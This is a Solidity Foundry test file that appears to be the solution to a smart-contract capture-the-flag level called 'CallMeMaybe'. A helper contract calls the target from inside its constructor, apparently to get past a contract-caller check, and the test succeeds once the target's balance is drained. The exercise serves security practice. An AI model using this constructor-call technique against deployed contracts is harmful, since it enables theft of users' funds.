// SPDX-License-Identifier: MIT
pragma solidity ^0.8.25;

import "./BaseTest.t.sol";
import "../src/05_CallMeMaybe/CallMeMaybe.sol";

contract Cushion is BaseTest {
    constructor(CallMeMaybe instance) {
        
        //assertEq(msg.sender, tx.origin);
        instance.hereIsMyNumber();
    }
}

// forge test --match-contract CallMeMaybeTest -vvvv
contract CallMeMaybeTest is BaseTest {
    CallMeMaybe instance;

    function setUp() public override {
        super.setUp();
        payable(user1).transfer(0.01 ether);
        instance = new CallMeMaybe{value: 0.01 ether}();
    }

    function testExploitLevel() public {
        Cushion cushion = new Cushion(instance);
        //cushion.testExploitLevel();

        checkSuccess();
    }

    function checkSuccess() internal view override {
        assertTrue(address(instance).balance == 0, "Solution is not solving the level");
    }
}
